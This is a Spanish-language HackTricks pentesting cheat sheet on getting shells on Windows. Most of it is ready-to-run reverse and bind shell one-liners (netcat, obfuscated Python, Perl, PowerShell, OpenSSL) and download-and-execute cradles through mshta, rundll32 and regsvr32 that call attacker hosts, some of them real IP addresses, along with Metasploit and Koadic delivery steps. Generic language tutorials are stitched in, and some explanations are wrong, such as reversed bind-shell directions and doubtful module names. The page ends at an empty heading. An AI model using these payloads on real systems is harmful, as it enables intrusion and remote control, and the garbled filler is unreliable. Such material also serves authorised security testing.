# Shells - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtén recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Obtendrás la recompensa después de que se verifique el error.

**Obtén experiencia en pentesting web3**\
¡Los protocolos blockchain y los contratos inteligentes son el nuevo Internet! Domina la seguridad web3 en sus días de crecimiento.

**Conviértete en la leyenda del hacker web3**\
Gana puntos de reputación con cada error verificado y conquista la cima de la clasificación semanal.

[**Regístrate en HackenProof**](https://hackenproof.com/register) ¡comienza a ganar con tus hacks!

{% embed url="https://hackenproof.com/register" %}

## Lolbas

La página [lolbas-project.github.io](https://lolbas-project.github.io/) es para Windows como [https://gtfobins.github.io/](https://gtfobins.github.io/) es para Linux.\
Obviamente, **no hay archivos SUID ni privilegios de sudo en Windows**, pero es útil saber **cómo** algunos **binarios** pueden ser (ab)usados para realizar algún tipo de acciones inesperadas como **ejecutar código arbitrario**.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd** es un clon de Netcat, diseñado para ser portátil y ofrecer una fuerte encriptación. Se ejecuta en sistemas operativos tipo Unix y en Microsoft Win32. sbd cuenta con encriptación AES-CBC-128 + HMAC-SHA1 (por Christophe Devine), ejecución de programas (opción -e), elección del puerto de origen, reconexión continua con retraso y otras características interesantes. sbd solo admite comunicación TCP/IP. sbd.exe (parte de la distribución Kali Linux: /usr/share/windows-resources/sbd/sbd.exe) se puede cargar en un equipo con Windows como una alternativa a Netcat.

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl es un lenguaje de programación interpretado y versátil que se utiliza comúnmente en el desarrollo de scripts y en la administración de sistemas. Es especialmente útil para la automatización de tareas y el procesamiento de texto. Perl proporciona una amplia gama de funciones y módulos que facilitan la manipulación de archivos, la comunicación en red y la interacción con el sistema operativo.

### Ejecución de comandos en Windows

En Windows, se puede utilizar Perl para ejecutar comandos del sistema y obtener la salida resultante. Esto puede ser útil para realizar tareas como la enumeración de archivos, la obtención de información del sistema y la ejecución de programas externos.

Para ejecutar un comando en Windows utilizando Perl, se puede utilizar la función `system()` o la función `backticks`. Ambas funciones permiten ejecutar comandos y capturar la salida resultante.

#### Ejemplo: Ejecutar el comando "ipconfig"

```perl
my $output = `ipconfig`;
print $output;
```

En este ejemplo, el comando `ipconfig` se ejecuta utilizando la función `backticks` y la salida resultante se almacena en la variable `$output`. Luego, se imprime el contenido de la variable `$output`.

#### Ejemplo: Ejecutar el comando "dir" con argumentos

```perl
my $output = `dir /s /b`;
print $output;
```

En este ejemplo, el comando `dir` se ejecuta con los argumentos `/s` y `/b`, que muestran una lista de archivos en formato breve y recursivamente. La salida resultante se almacena en la variable `$output` y se imprime.

### Manipulación de archivos en Windows

Perl también proporciona funciones para manipular archivos en Windows. Estas funciones permiten crear, leer, escribir y modificar archivos.

#### Ejemplo: Leer el contenido de un archivo

```perl
open(my $file, '<', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
while (my $line = <$file>) {
    chomp $line;
    print "$line\n";
}
close($file);
```

En este ejemplo, se abre el archivo `archivo.txt` en modo de lectura utilizando la función `open()`. Luego, se lee el contenido del archivo línea por línea utilizando un bucle `while`. Cada línea se imprime y se elimina el carácter de nueva línea utilizando la función `chomp()`. Finalmente, se cierra el archivo utilizando la función `close()`.

#### Ejemplo: Escribir en un archivo

```perl
open(my $file, '>', 'archivo.txt') or die "No se pudo abrir el archivo: $!";
print $file "Hola, mundo!\n";
close($file);
```

En este ejemplo, se abre el archivo `archivo.txt` en modo de escritura utilizando la función `open()`. Luego, se escribe la cadena "Hola, mundo!" en el archivo utilizando la función `print()`. Finalmente, se cierra el archivo utilizando la función `close()`.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby es un lenguaje de programación dinámico y orientado a objetos que se utiliza ampliamente en el desarrollo web. Es conocido por su sintaxis elegante y su enfoque en la legibilidad del código. Ruby es compatible con una amplia gama de sistemas operativos, incluidos Windows, macOS y Linux.

### Instalación de Ruby en Windows

Para instalar Ruby en Windows, puedes seguir estos pasos:

1. Ve al sitio web oficial de Ruby en [https://www.ruby-lang.org](https://www.ruby-lang.org) y descarga la versión más reciente del instalador de Ruby para Windows.

2. Ejecuta el instalador descargado y sigue las instrucciones en pantalla para completar la instalación.

3. Una vez que la instalación haya finalizado, abre el símbolo del sistema (Command Prompt) y verifica que Ruby se haya instalado correctamente ejecutando el siguiente comando:

   ```
   ruby --version
   ```

   Deberías ver la versión de Ruby instalada en tu sistema.

### Ejecución de scripts Ruby

Para ejecutar un script Ruby en Windows, sigue estos pasos:

1. Abre el símbolo del sistema (Command Prompt) y navega hasta la ubicación del archivo de script Ruby.

2. Ejecuta el siguiente comando para ejecutar el script:

   ```
   ruby nombre_del_script.rb
   ```

   Asegúrate de reemplazar "nombre_del_script.rb" con el nombre real de tu archivo de script Ruby.

### Interacción con la consola de Ruby

Ruby proporciona una consola interactiva que te permite ejecutar código Ruby en tiempo real. Para abrir la consola de Ruby en Windows, sigue estos pasos:

1. Abre el símbolo del sistema (Command Prompt).

2. Ejecuta el siguiente comando para abrir la consola de Ruby:

   ```
   irb
   ```

   Ahora puedes ingresar y ejecutar código Ruby directamente en la consola.

### Recursos adicionales

Aquí hay algunos recursos adicionales que pueden ser útiles para aprender más sobre Ruby:

- [Sitio web oficial de Ruby](https://www.ruby-lang.org)
- [Ruby-Doc.org](https://ruby-doc.org) - Documentación oficial de Ruby
- [RubyGems.org](https://rubygems.org) - Repositorio de gemas de Ruby
- [Ruby on Rails](https://rubyonrails.org) - Framework de desarrollo web basado en Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua es un lenguaje de programación ligero y de alto nivel que se utiliza comúnmente en el desarrollo de videojuegos y aplicaciones embebidas. Es conocido por su simplicidad, eficiencia y facilidad de integración con otros lenguajes. Lua se puede utilizar como un shell en sistemas Windows para ejecutar comandos y scripts.

### Shell de Lua en Windows

Para utilizar Lua como un shell en Windows, primero debes descargar e instalar el intérprete de Lua desde el sitio web oficial. Una vez instalado, puedes abrir una ventana de comandos y ejecutar el comando `lua` para iniciar el shell de Lua.

El shell de Lua te permite ejecutar comandos y scripts de Lua directamente desde la línea de comandos. Puedes ingresar comandos de una sola línea o escribir scripts de varias líneas para realizar tareas más complejas.

### Ejecución de comandos de Lua

Para ejecutar un comando de Lua en el shell, simplemente escribe el código Lua y presiona Enter. El shell ejecutará el comando y mostrará el resultado en la siguiente línea.

Por ejemplo, puedes ejecutar el siguiente comando para imprimir "Hola, mundo!" en el shell de Lua:

```lua
print("Hola, mundo!")
```

### Ejecución de scripts de Lua

Además de ejecutar comandos individuales, también puedes ejecutar scripts de Lua completos en el shell. Para hacer esto, primero debes crear un archivo de texto con extensión `.lua` que contenga el código Lua que deseas ejecutar.

Una vez que hayas creado el archivo de script, puedes ejecutarlo en el shell utilizando el siguiente comando:

```lua
dofile("ruta/al/archivo.lua")
```

Reemplaza `"ruta/al/archivo.lua"` con la ruta real del archivo de script en tu sistema.

### Ventajas del shell de Lua en Windows

El shell de Lua en Windows ofrece varias ventajas para los desarrolladores y los entusiastas de Lua. Algunas de estas ventajas incluyen:

- Interfaz de línea de comandos fácil de usar para ejecutar comandos y scripts de Lua.
- Integración con otros lenguajes y sistemas.
- Capacidad para realizar pruebas rápidas y experimentar con código Lua.
- Soporte para la ejecución de scripts de Lua completos.

Con el shell de Lua en Windows, puedes aprovechar al máximo el poder y la flexibilidad de Lua en tu entorno de desarrollo.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Atacante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Shells en Windows

Un shell es una interfaz de línea de comandos que permite a un atacante interactuar con un sistema comprometido. En Windows, hay varias opciones de shells que se pueden utilizar para llevar a cabo actividades de hacking.

## Shells reversos

Un shell reverso es una técnica en la que el atacante establece una conexión desde el sistema comprometido hacia su máquina, permitiéndole ejecutar comandos en el sistema comprometido de forma remota. Esto es útil cuando el sistema comprometido está detrás de un firewall o un enrutador que bloquea las conexiones entrantes.

### Netcat

Netcat es una herramienta de red que se puede utilizar para crear un shell reverso en Windows. Permite la transferencia de datos a través de conexiones TCP y UDP. Para crear un shell reverso con Netcat, el atacante debe ejecutar el siguiente comando en su máquina:

```
nc -lvp <puerto>
```

Luego, en el sistema comprometido, el atacante debe ejecutar el siguiente comando para establecer la conexión:

```
nc <ip_atacante> <puerto> -e cmd.exe
```

Esto abrirá una sesión de shell en el sistema comprometido, permitiendo al atacante ejecutar comandos.

### PowerShell

PowerShell es una herramienta de administración y automatización de tareas en Windows. También se puede utilizar para crear un shell reverso. Para hacer esto, el atacante puede ejecutar el siguiente comando en su máquina:

```
nc -lvp <puerto> -e powershell.exe
```

Luego, en el sistema comprometido, el atacante debe ejecutar el siguiente comando para establecer la conexión:

```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<ip_atacante>', <puerto>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Esto establecerá una conexión de shell reverso utilizando PowerShell.

## Shells bind

Un shell bind es una técnica en la que el atacante establece una conexión desde su máquina hacia el sistema comprometido, permitiéndole ejecutar comandos en el sistema comprometido de forma remota. Esto es útil cuando el sistema comprometido no está detrás de un firewall o un enrutador que bloquea las conexiones entrantes.

### Netcat

Netcat también se puede utilizar para crear un shell bind en Windows. Para hacer esto, el atacante debe ejecutar el siguiente comando en su máquina:

```
nc -lvp <puerto> -e cmd.exe
```

Luego, en el sistema comprometido, el atacante debe ejecutar el siguiente comando para establecer la conexión:

```
nc <ip_atacante> <puerto>
```

Esto abrirá una sesión de shell en el sistema comprometido, permitiendo al atacante ejecutar comandos.

### PowerShell

PowerShell también se puede utilizar para crear un shell bind en Windows. Para hacer esto, el atacante puede ejecutar el siguiente comando en su máquina:

```
powershell.exe -c "$listener = [System.Net.Sockets.TcpListener]'<ip_atacante>', <puerto>; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Luego, en el sistema comprometido, el atacante debe ejecutar el siguiente comando para establecer la conexión:

```
nc <ip_atacante> <puerto>
```

Esto establecerá una conexión de shell bind utilizando PowerShell.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell es una poderosa herramienta de línea de comandos y scripting desarrollada por Microsoft. Es especialmente útil para la administración y automatización de tareas en sistemas Windows.

### Ejecución de comandos

Powershell permite ejecutar comandos de forma interactiva o mediante scripts. Para ejecutar un comando, simplemente escriba el nombre del comando seguido de los argumentos necesarios. Por ejemplo:

```powershell
Get-Process
```

### Variables y tipos de datos

Powershell admite variables para almacenar y manipular datos. Las variables se pueden declarar utilizando el prefijo "$" seguido del nombre de la variable. Por ejemplo:

```powershell
$nombre = "Juan"
```

Powershell también admite diferentes tipos de datos, como cadenas de texto, números enteros y booleanos.

### Estructuras de control

Powershell proporciona estructuras de control como bucles y condicionales para controlar el flujo de ejecución de un script. Por ejemplo, el bucle "foreach" se utiliza para iterar sobre una colección de elementos:

```powershell
foreach ($elemento in $coleccion) {
    # hacer algo con $elemento
}
```

### Funciones

Powershell permite definir funciones para encapsular un conjunto de instrucciones y reutilizarlas en diferentes partes de un script. Por ejemplo:

```powershell
function Saludar {
    param (
        [string]$nombre
    )
    Write-Host "Hola, $nombre"
}

Saludar -nombre "Juan"
```

### Gestión de archivos y directorios

Powershell proporciona comandos para trabajar con archivos y directorios. Por ejemplo, el comando "Get-ChildItem" se utiliza para obtener una lista de archivos y directorios en una ubicación específica:

```powershell
Get-ChildItem C:\Directorio
```

### Interacción con el sistema operativo

Powershell permite interactuar con el sistema operativo y realizar tareas como la creación de procesos, la modificación de variables de entorno y la gestión de servicios. Por ejemplo, el comando "Start-Process" se utiliza para iniciar un nuevo proceso:

```powershell
Start-Process -FilePath "C:\Programa.exe"
```

Powershell es una herramienta versátil y poderosa que puede ser utilizada para una amplia gama de tareas de administración y automatización en sistemas Windows. Con un conocimiento sólido de Powershell, los hackers pueden aprovechar su potencial para llevar a cabo ataques y pruebas de penetración de manera efectiva.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Proceso que realiza una llamada de red: **powershell.exe**\
Carga escrita en el disco: **NO** (_al menos en ningún lugar que pude encontrar usando procmon !_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en el disco: **caché local del cliente WebDAV**

**En una línea:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Obtén más información sobre diferentes Shells de Powershell al final de este documento**

## Mshta
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
Proceso que realiza una llamada de red: **mshta.exe**\
Carga escrita en disco: **caché local de IE**
```bash
mshta http://webserver/payload.hta
```
Proceso que realiza una llamada de red: **mshta.exe**\
Carga escrita en disco: **caché local de IE**
```bash
mshta \\webdavserver\folder\payload.hta
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga escrita en el disco: **caché local del cliente WebDAV**

#### **Ejemplo de shell inverso hta-psh (utiliza hta para descargar y ejecutar una puerta trasera de PowerShell)**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Puedes descargar y ejecutar muy fácilmente un zombie Koadic utilizando el stager hta**

#### Ejemplo de hta
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

El método `mshta - sct` es una técnica de ejecución de comandos en Windows que aprovecha la utilidad `mshta.exe` y los archivos de script de componente (`sct`) para ejecutar código malicioso. Esta técnica es útil para evadir la detección de antivirus y ejecutar comandos sin dejar rastro en el disco.

##### **Pasos:**

1. Crear un archivo de script de componente (`sct`) que contenga el código malicioso. Este archivo puede ser generado utilizando herramientas como `msfvenom` o escribiendo el código manualmente.

2. Generar un archivo HTML que invoque el archivo de script de componente (`sct`) utilizando la utilidad `mshta.exe`. El código HTML debe contener una etiqueta `<script>` que haga referencia al archivo `sct`.

3. Ejecutar el archivo HTML utilizando el comando `mshta.exe`. Esto ejecutará el código malicioso contenido en el archivo de script de componente (`sct`).

##### **Ejemplo:**

```html
<html>
<head>
<script language="VBScript">
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "calc.exe"
</script>
</head>
<body>
</body>
</html>
```

En este ejemplo, el archivo HTML ejecutará la calculadora de Windows (`calc.exe`) al abrirlo con `mshta.exe`. Este es solo un ejemplo básico, pero se puede utilizar cualquier código malicioso en el archivo de script de componente (`sct`) para ejecutar comandos más avanzados.

##### **Consideraciones:**

- Esta técnica puede ser detectada por soluciones de seguridad que monitorean la ejecución de `mshta.exe` o analizan el contenido de los archivos `sct`. Se recomienda probar la efectividad de esta técnica en el entorno objetivo antes de su implementación.

- Es importante tener en cuenta que el uso de esta técnica puede ser considerado como actividad maliciosa y puede ser ilegal sin el consentimiento adecuado. Se debe obtener el permiso y seguir las leyes y regulaciones aplicables antes de utilizar esta técnica en un entorno de prueba o en un entorno de pentesting autorizado.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a Microsoft utility that allows the execution of HTML applications (HTAs) on Windows systems. It is often used by attackers to bypass security measures and execute malicious code.

Metasploit, a popular penetration testing framework, includes a module that leverages mshta to deliver payloads to target systems. This module, called "exploit/windows/browser/mshta", allows an attacker to create a malicious HTA file and deliver it to a victim's system.

To use this module, the attacker needs to set the "SRVHOST" and "SRVPORT" options to specify the IP address and port of the Metasploit listener. The "URIPATH" option can be used to specify a custom URI path for the HTA file.

Once the options are set, the attacker can run the exploit and wait for the victim to open the HTA file. When the file is opened, the payload is executed on the target system, giving the attacker remote access.

It is important to note that the mshta module in Metasploit is just one of many techniques that can be used to exploit vulnerabilities in Windows systems. As a penetration tester, it is crucial to understand and utilize a variety of tools and techniques to ensure comprehensive testing and assessment of target systems.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Detectado por el defensor**

## **Rundll32**

[Ejemplo de "hello world" en Dll](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
Proceso que realiza una llamada de red: **rundll32.exe**\
Carga útil escrita en disco: **caché local de IE**

**Detectado por el defensor**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by an attacker to execute malicious code on a target system.

Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32 to achieve code execution on the target system.

To use this technique, follow these steps:

1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit:
```
msf > use windows/local/hta
msf exploit(windows/local/hta) > set LHOST <attacker IP>
msf exploit(windows/local/hta) > set LPORT <attacker port>
msf exploit(windows/local/hta) > exploit
```

2. Once the HTA file is generated, transfer it to the target system.

3. Execute the HTA file using Rundll32:
```
rundll32.exe <path to HTA file>,<entry point>
```

By leveraging Rundll32 and Metasploit, an attacker can execute arbitrary code on a target system, potentially gaining unauthorized access or performing other malicious activities. It is important to note that this technique may trigger security alerts and should only be used in controlled environments for legitimate purposes such as penetration testing.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute their code. One popular tool that utilizes this technique is Koadic.

Koadic is a post-exploitation RAT (Remote Access Trojan) that provides a command-and-control interface to interact with compromised systems. It uses the rundll32 utility to load its DLL payload and establish a backdoor on the target machine.

To use Koadic, the attacker first needs to generate a malicious DLL payload using the Koadic framework. This payload is then loaded using the rundll32 utility, which executes the code contained within the DLL. Once the payload is executed, the attacker gains remote access to the compromised system and can perform various malicious activities.

Koadic provides a wide range of features, including file system access, keylogging, screenshot capture, and network reconnaissance. It also supports multiple communication channels, such as HTTP, DNS, and ICMP, making it difficult to detect and block.

To prevent attacks utilizing Rundll32 and Koadic, it is important to implement strong security measures, such as regularly updating software, using strong passwords, and employing network segmentation. Additionally, monitoring network traffic and using intrusion detection systems can help detect and mitigate potential threats.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32 es una utilidad de línea de comandos en Windows que se utiliza para registrar y desregistrar bibliotecas de vínculos dinámicos (DLL) y controles ActiveX en el Registro del sistema. Esta herramienta es especialmente útil para la instalación y desinstalación de componentes de software en el sistema operativo Windows.

### Uso básico

El comando básico para registrar una DLL o un control ActiveX utilizando Regsvr32 es el siguiente:

```
regsvr32 <ruta_del_archivo>
```

Donde `<ruta_del_archivo>` es la ubicación completa del archivo DLL o control ActiveX que se desea registrar. Una vez ejecutado el comando, Regsvr32 intentará registrar el archivo especificado en el Registro del sistema.

### Registro exitoso

Si el registro es exitoso, Regsvr32 mostrará un mensaje de confirmación indicando que la operación se completó correctamente. Por ejemplo:

```
DllRegisterServer en <ruta_del_archivo> se realizó correctamente.
```

Esto significa que la DLL o el control ActiveX se han registrado correctamente en el sistema.

### Registro fallido

En caso de que el registro falle, Regsvr32 mostrará un mensaje de error indicando la causa del problema. Algunas posibles razones de fallo pueden ser:

- El archivo DLL o control ActiveX no existe en la ubicación especificada.
- El archivo DLL o control ActiveX está dañado o no es compatible con la versión del sistema operativo.
- El usuario no tiene los permisos necesarios para registrar el archivo.

En estos casos, es necesario solucionar el problema subyacente antes de intentar registrar nuevamente el archivo.

### Desregistro de archivos

Para desregistrar una DLL o un control ActiveX previamente registrado, se utiliza el siguiente comando:

```
regsvr32 /u <ruta_del_archivo>
```

Donde `/u` indica que se desea desregistrar el archivo. Una vez ejecutado el comando, Regsvr32 intentará desregistrar el archivo especificado en el Registro del sistema.

### Conclusiones

Regsvr32 es una herramienta útil para registrar y desregistrar DLL y controles ActiveX en el Registro del sistema de Windows. Con su uso adecuado, es posible instalar y desinstalar componentes de software de manera efectiva en el sistema operativo.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
Proceso que realiza una llamada de red: **regsvr32.exe**\
Carga útil escrita en disco: **caché local de IE**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
Proceso que realiza una llamada de red: **svchost.exe**\
Carga útil escrita en disco: **caché local del cliente WebDAV**

**Detectado por el defensor**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

